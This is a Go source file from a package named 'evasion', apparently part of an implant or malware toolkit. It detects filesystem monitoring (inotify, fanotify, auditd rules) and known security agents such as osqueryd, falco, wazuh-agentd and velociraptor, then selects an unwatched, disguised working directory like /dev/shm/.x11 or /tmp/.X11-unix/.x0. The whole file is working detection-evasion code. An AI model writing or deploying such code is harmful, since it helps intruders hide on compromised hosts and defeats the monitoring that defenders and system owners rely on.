package evasion

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

// FSWatchInfo holds information about filesystem monitoring on the system.
type FSWatchInfo struct {
	InotifyWatches []InotifyWatch
	FanotifyActive bool
	MonitoredPaths map[string]bool // paths being watched
	RiskPaths      []string        // our paths that are being watched
}

// InotifyWatch represents an active inotify watch.
type InotifyWatch struct {
	PID         int
	ProcessName string
	WatchCount  int
	Paths       []string // resolved paths if determinable
}

// DetectFSWatches checks for active filesystem monitoring that could detect our workspace.
func DetectFSWatches(ourPaths []string) *FSWatchInfo {
	info := &FSWatchInfo{
		MonitoredPaths: make(map[string]bool),
	}

	info.InotifyWatches = enumerateInotifyWatches()
	info.FanotifyActive = detectFanotify()

	// Call DetectAudit once and reuse for all path checks to avoid
	// redundant /proc and auditctl scans per path.
	auditInfo := DetectAudit()

	// Check if any of our paths are at risk
	for _, p := range ourPaths {
		if isPathAtRisk(p, info, auditInfo) {
			info.RiskPaths = append(info.RiskPaths, p)
		}
	}

	return info
}

// IsPathSafeToWrite checks if writing to a path would trigger filesystem monitoring.
func IsPathSafeToWrite(path string) bool {
	info := DetectFSWatches([]string{path})
	return len(info.RiskPaths) == 0 && !info.FanotifyActive
}

// FindSafeWorkDir returns the first path from candidates that is not being monitored.
// Falls back to creating a memfd-backed tmpfs if all paths are watched.
func FindSafeWorkDir(candidates []string) string {
	// Perform a single scan for all candidates to avoid N full /proc scans.
	info := DetectFSWatches(candidates)
	riskSet := make(map[string]bool, len(info.RiskPaths))
	for _, p := range info.RiskPaths {
		riskSet[p] = true
	}
	for _, path := range candidates {
		if !riskSet[path] && !info.FanotifyActive {
			return path
		}
	}
	// All candidates monitored — use /proc/self/fd/ backed workspace
	// Caller should use memfd_create instead of disk
	return ""
}

// DefaultWorkspaceCandidates returns common paths to try for workspace, ordered by preference.
func DefaultWorkspaceCandidates() []string {
	return []string{
		"/dev/shm/.x11",
		"/dev/shm/.cache",
		"/tmp/.X11-unix/.x0",
		"/var/tmp/.pkg-cache",
		"/run/lock/.session",
		"/dev/mqueue/.data",
	}
}

// enumerateInotifyWatches scans /proc for processes with inotify watches.
func enumerateInotifyWatches() []InotifyWatch {
	var watches []InotifyWatch

	entries, err := os.ReadDir("/proc")
	if err != nil {
		return nil
	}

	for _, entry := range entries {
		pid, err := strconv.Atoi(entry.Name())
		if err != nil {
			continue
		}

		fdInfoDir := fmt.Sprintf("/proc/%d/fdinfo", pid)
		fdDir := fmt.Sprintf("/proc/%d/fd", pid)

		fds, err := os.ReadDir(fdDir)
		if err != nil {
			continue
		}

		watchCount := 0
		for _, fd := range fds {
			infoPath := filepath.Join(fdInfoDir, fd.Name())
			if isInotifyFd(infoPath) {
				count := countInotifyWatches(infoPath)
				watchCount += count
			}
		}

		if watchCount > 0 {
			name := readProcComm(pid)
			watches = append(watches, InotifyWatch{
				PID:         pid,
				ProcessName: name,
				WatchCount:  watchCount,
			})
		}
	}

	return watches
}

// isInotifyFd checks if an fd's fdinfo indicates it's an inotify instance.
func isInotifyFd(fdInfoPath string) bool {
	f, err := os.Open(fdInfoPath)
	if err != nil {
		return false
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		if strings.HasPrefix(scanner.Text(), "inotify ") {
			return true
		}
	}
	return false
}

// countInotifyWatches counts inotify watch entries in an fdinfo file.
func countInotifyWatches(fdInfoPath string) int {
	f, err := os.Open(fdInfoPath)
	if err != nil {
		return 0
	}
	defer f.Close()

	count := 0
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		if strings.HasPrefix(scanner.Text(), "inotify ") {
			count++
		}
	}
	return count
}

// detectFanotify checks if any process has fanotify instances open.
func detectFanotify() bool {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return false
	}

	for _, entry := range entries {
		pid, err := strconv.Atoi(entry.Name())
		if err != nil {
			continue
		}

		fdInfoDir := fmt.Sprintf("/proc/%d/fdinfo", pid)
		fds, err := os.ReadDir(fmt.Sprintf("/proc/%d/fd", pid))
		if err != nil {
			continue
		}

		for _, fd := range fds {
			infoPath := filepath.Join(fdInfoDir, fd.Name())
			if isFanotifyFd(infoPath) {
				return true
			}
		}
	}
	return false
}

// isFanotifyFd checks if an fd's fdinfo indicates it's a fanotify instance.
func isFanotifyFd(fdInfoPath string) bool {
	f, err := os.Open(fdInfoPath)
	if err != nil {
		return false
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		if strings.HasPrefix(scanner.Text(), "fanotify ") {
			return true
		}
	}
	return false
}

// isPathAtRisk checks if a path is likely being monitored.
// auditInfo is passed in to avoid redundant DetectAudit() calls per path.
func isPathAtRisk(path string, info *FSWatchInfo, auditInfo *AuditInfo) bool {
	// Check if any known monitoring process is watching many paths
	// (heuristic — processes with many watches are likely security tools)
	for _, w := range info.InotifyWatches {
		name := strings.ToLower(w.ProcessName)
		// Security tools with filesystem watches
		if isSecurityWatcher(name) && w.WatchCount > 0 {
			return true
		}
		// Processes with very high watch counts are likely monitoring tools
		if w.WatchCount > 100 {
			return true
		}
	}

	// If fanotify is active, all filesystem activity is potentially monitored
	if info.FanotifyActive {
		return true
	}

	// Check auditd watch rules for our path
	if auditInfo != nil && auditInfo.Active {
		if IsPathWatched(auditInfo, path) {
			return true
		}
		// Check parent directories
		dir := filepath.Dir(path)
		if IsPathWatched(auditInfo, dir) {
			return true
		}
	}

	return false
}

// isSecurityWatcher returns true if the process name is a known security/monitoring tool.
func isSecurityWatcher(name string) bool {
	securityTools := map[string]bool{
		"osqueryd":      true,
		"falco":         true,
		"wazuh-agentd":  true,
		"auditd":        true,
		"sysmon":        true,
		"filebeat":      true,
		"aide":          true,
		"tripwire":      true,
		"samhain":       true,
		"ossec":         true,
		"elastic-agent": true,
		"velociraptor":  true,
	}
	return securityTools[name]
}

// readProcComm reads the process name from /proc/[pid]/comm.
func readProcComm(pid int) string {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/comm", pid))
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(data))
}
